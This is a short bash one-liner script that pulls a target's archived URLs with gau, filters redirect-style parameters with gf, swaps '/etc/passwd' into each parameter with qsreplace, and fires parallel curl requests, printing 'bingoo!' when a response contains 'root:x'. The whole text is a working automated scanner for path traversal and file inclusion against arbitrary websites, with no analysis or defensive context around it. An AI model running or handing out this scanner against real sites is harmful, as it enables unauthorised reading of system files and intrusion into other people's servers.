#!/bin/bash

~/go/bin/gau $1 |~/go/bin/gf redirect | ~/go/bin/qsreplace "/etc/passwd" | xargs -I % -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "bingoo! %"'

